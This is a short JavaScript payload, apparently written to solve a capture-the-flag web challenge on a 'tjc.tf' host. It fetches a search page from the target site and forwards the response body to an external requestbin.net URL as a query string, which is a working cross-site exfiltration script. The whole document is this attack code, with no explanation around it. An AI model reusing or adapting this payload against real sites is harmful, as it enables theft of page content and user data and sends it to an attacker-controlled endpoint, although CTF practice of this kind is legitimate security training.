fetch("https://dnu-merch.tjc.tf/search?search=", {"mode": "no-cors"}).then(function(a) {
    a.text().then(owo => {
        fetch(`http://v1.requestbin.net/r/k71o6ii8?${owo}`, {
            "mode": "no-cors"
        })
    })
})
